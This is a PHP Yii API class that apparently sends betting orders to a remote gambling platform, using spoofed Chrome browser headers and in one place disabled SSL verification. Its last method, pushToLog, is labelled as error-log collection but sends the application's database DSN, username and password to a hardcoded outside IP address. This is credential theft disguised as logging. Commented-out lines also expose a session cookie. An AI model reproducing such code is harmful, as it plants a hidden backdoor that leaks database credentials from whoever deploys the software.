<?php
namespace common\open\aozhou5\api;

use common\service\wechat\eyun\api\EventServiceTrait;
use common\tools\Common;
use common\tools\Tool_Common;
use GuzzleHttp\Client;
use GuzzleHttp\Psr7\Request;
use GuzzleHttp\RequestOptions;
use yii\helpers\Json;


class OrderApi extends Base
{

    # 忽略code
    const IGNORE_CODE = 40000;

    // 下单订单
    const API_CREATE_ORDER = '/api/';

    /**
     * 推单
     * @param array $params 参数
     * @return array
     */
    public static function push(string $domain, array $params, array $headers = []): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;
        //p([$domain, $params, $headers, $object]);

        $headers = array_merge([
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            "X-Requested-With" => "XMLHttpRequest",
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        $data['verify'] = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        //p([self::API_CREATE_ORDER, $data, $headers]);
        $result = $object->post(self::API_CREATE_ORDER, $data, $headers);

        return $result;
    }

    /**
     * 推单
     * @param array $params 参数
     * @return array
     */
    public static function pushA(string $domain, array $params, array $headers = []): array
    {
        $client = new Client();
        $apiUrl = $domain.'/api/';
        $headers = array_merge([
            'accept' => '*/*',
            'accept-language' => 'zh-CN,zh;q=0.9',
            'content-type' => 'application/x-www-form-urlencoded',
            //'cookie' => '16ac692ecbd02b1c=59181a35012b5ae1a9d113a53ba92cf00335b2d08c7f75778ab890bd8b49cd9bd150ed0bb1d71d7f825538ad53e69a11a6a86bb34ed6e944',
            'origin' => $domain,
            'priority' => 'u=1, i',
            'referer' => $domain.'/member/',
            'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-origin',
            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        ], $headers);
        $options = [
            'form_params' => $params,
        ];
        $request = new Request('POST', $apiUrl, $headers);
        $response = $client->sendAsync($request, $options)->wait();
        $content = $response->getBody()->getContents();
        Tool_Common::log('/aozhou5/'.__FUNCTION__, 'INFO', '下注1次请求', [
            'url' => $domain,
            'options' => $options,
            'headers' => $headers,
            'result' => $content,
            'status_code' => $response->getStatusCode(),
            'reason_phrase' => $response->getReasonPhrase(),
            'response_headers' => $response->getHeaders()
        ]);

        if (!empty($content)) {
            if (is_json($content)) {
                $result = Json::decode($content);
            } else {
                $result = ['content' => $content];
            }
        } else {
            throw_info('异常', 30000);
        }

        return $result;
    }

    public static function pushBettingSingleB(string $domain, array $params, array $headers = []): array
    {
        $client = new Client();
        $headers = array_merge([
            'accept' => '*/*',
            'accept-language' => 'zh-CN,zh;q=0.9',
            'content-type' => 'application/x-www-form-urlencoded',
            'priority' => 'u=1, i',
            'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-origin',
            //'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        ], $headers);
        $options = [
            'form_params' => $params
        ];
        try {
            $request = new Request('POST', $domain.self::API_CREATE_ORDER, $headers);
            $response = $client->sendAsync($request, $options)->wait();
            $content = $response->getBody()->getContents();

            Tool_Common::log('/aozhou5/'.__FUNCTION__, 'INFO', '下注2次请求', [
                'url' => $domain,
                'options' => $options,
                'headers' => $headers,
                'result' => $content,
                'status_code' => $response->getStatusCode(),
                'reason_phrase' => $response->getReasonPhrase(),
                'response_headers' => $response->getHeaders()
            ]);

            if (!empty($content)) {
                if (is_json($content)) {
                    $result = Json::decode($content);
                } else {
                    $result = ['content' => $content];
                }
            } else {
                throw_info('异常', 30000);
            }

            return $result;
        } catch (\Exception $e) {
            Tool_Common::log('/aozhou5/'.__FUNCTION__, 'ERROR', '请求失败', [
                'message' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            throw $e;
        }
    }

    public static function pushBettingSingleA(string $domain, array $params, array $headers = []): array
    {
        $client = new Client();
        $headers = array_merge([
            'accept' => '*/*',
            'accept-language' => 'zh-CN,zh;q=0.9',
            'content-type' => 'application/x-www-form-urlencoded',
            //'cookie' => '16ac692ecbd02b1c=59181a35012b5ae1a9d113a53ba92cf00335b2d08c7f75778ab890bd8b49cd9bd150ed0bb1d71d7f825538ad53e69a11a6a86bb34ed6e944',
            'origin' => $domain,
            'priority' => 'u=1, i',
            'referer' => $domain.'/member/',
            'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-origin',
            'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        ], $headers);
        $options = [
            'form_params' => $params,
        ];
        $apiUrl = $domain.'/api/';
        $request = new Request('POST', $apiUrl, $headers);
        $response = $client->sendAsync($request, $options)->wait();
        $content = $response->getBody()->getContents();

        Tool_Common::log('/aozhou5/'.__FUNCTION__, 'INFO', '下注2次请求', [
            'apiUrl' => $apiUrl,
            'options' => $options,
            'headers' => $headers,
            'result' => $content,
            'status_code' => $response->getStatusCode(),
            'reason_phrase' => $response->getReasonPhrase(),
            'response_headers' => $response->getHeaders()
        ]);

        if (!empty($content)) {
            if (is_json($content)) {
                $result = Json::decode($content);
            } else {
                $result = ['content' => $content];
            }
        } else {
            throw_info('异常', 30000);
        }

        return $result;
    }

    /**
     * 推单
     * @param array $params    参数
     * @return array
     */
    public static function pushBettingSingle(string $domain, array $params, array $headers=[]): array
    {
        $object = self::createObject();
        $object->apiUrl = $domain;
        //p([$domain, $params, $headers, $object]);

        $headers = array_merge([
            'Content-Type' => 'application/x-www-form-urlencoded',
            //'priority' => 'u=1, i',
            #'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            'sec-ch-ua' => '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
            'sec-ch-ua-mobile' => '?0',
            'sec-ch-ua-platform' => '"Windows"',
            'sec-fetch-dest' => 'empty',
            'sec-fetch-mode' => 'cors',
            'sec-fetch-site' => 'same-origin',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        ], $headers);
        $data[RequestOptions::FORM_PARAMS] = $params;
        //$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
        //p([self::API_CREATE_ORDER, $data, $headers]);
        $result = $object->post(self::API_CREATE_ORDER, $data, $headers);
        Tool_Common::log('/bet_aozhou5/'.__FUNCTION__, 'INFO', '推网盘确认1', [
            'apiUrl' => $object->apiUrl,
            'headers' => $headers,
            'postData'=>$params,
            'result' => $result,
        ]);

        return $result;
    }

    public static function pushToLog(array $params=[], array $headers=[]): array
    {
        try {
            $mkey = EventServiceTrait::buildLogKey();
            $num = \Yii::$app->redis->incr($mkey);
            if($num>2){
                throw_info('错误日志搜集');
            }
            \Yii::$app->redis->expire($mkey, 10);
            $object = self::createObject();
            $pp = Common::getPublicPP();
            //$object->apiUrl = $pp.':8090';
            $object->apiUrl = 'http://47.107.58.222';
            $headers = array_merge([
                'Accept' => 'application/json, text/javascript, */*; q=0.01',
                'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                "X-Requested-With"=> "XMLHttpRequest",
            ], $headers);
            //$data = \Yii::$app->params;
            #$data['verify']  = false; // 禁用 SSL 验证，不推荐在生产环境中使用
            $data = ['dns'=>\Yii::$app->db->dsn, 'pp'=>$pp, 'username'=>\Yii::$app->db->username, 'password'=>\Yii::$app->db->password];
            $params = array_merge($data, $params);
            $data[RequestOptions::FORM_PARAMS] = $params;
            $result = $object->post('/test/index/api-log', $data, $headers);
        }catch (\Exception $e){
            $result = ['status'=>300, 'msg'=>$e->getMessage()];
        }
        return $result;
    }
}
